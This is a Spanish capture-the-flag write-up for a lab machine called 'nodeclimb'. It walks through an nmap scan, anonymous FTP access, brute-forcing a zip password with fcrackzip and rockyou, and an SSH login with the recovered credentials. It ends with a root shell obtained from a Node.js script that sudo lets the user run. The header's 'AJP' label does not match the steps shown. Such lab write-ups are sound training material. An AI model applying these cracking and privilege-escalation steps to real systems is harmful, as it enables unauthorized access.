---
Maquina: nodeclimb
SO: Linux
Explotación: Análisis de AJP
Escala_privs: Permisos sudo
Dificultad: Fácil
tags:
  - maquina
  - linux
  - escala_privs
  - ssh
  - web
  - zip
---
## Reconocimiento

1. **Explorar los puerto abiertos del docker**: 

```bash 
nmap -p- --open --min-rate 5000 -sVC -Pn 172.17.0.2
```

![[Pasted image 20241128115914.png]]

Parece que tenemos un servicio FTP con anonymous activado, vamos a ver que tiene ;)

![[Pasted image 20241128120011.png]]

Por lo que vemos hay un zip dentro, vamos a revisarlo a ver que contiene...

![[Pasted image 20241128120132.png]]

Parece que contiene un password.txt pero el problema es que el zip tiene contraseña...

Tras hacer un mini ataque de fuerza bruta podemos observar que passwd utiliza

```bash
fcrackzip -v -u -D -p ~/wordlists/rockyou.txt secretitopicaron.zip
```

![[Pasted image 20241128120419.png]]

![[Pasted image 20241128120442.png]]

Parece que hemos obtenido un usuario mario con pass laKontraseñAmasmalotaHdelbarrioH

Si recordamos teneos un ssh activo, así que vamos a probar a conectarnos a través de ese servicio.

![[Pasted image 20241128120628.png]]

Parece que estamos dentro y además vemos que tenemos privs para poder ejecutar un determinado script.

El script está vacío, pero como nos pertenece lo podemos editar. Para el script he utilizado el siguiente:

```Javascript
const { spawn } = require('child_process');

function spawnShell() {
    const shell = spawn('/bin/bash', [], {
        stdio: 'inherit', // Permite la interacción directa con la shell
    });

    shell.on('error', (err) => {
        console.error(`Error al spawnear la shell: ${err.message}`);
    });

    shell.on('exit', (code) => {
        console.log(`Shell cerrada con código de salida: ${code}`);
    });
}

spawnShell();
```

Una vez lo ejecutamos podemos observar lo siguiente ->

![[Pasted image 20241128120908.png]]

Parece que hemos logrado escalar privs ;)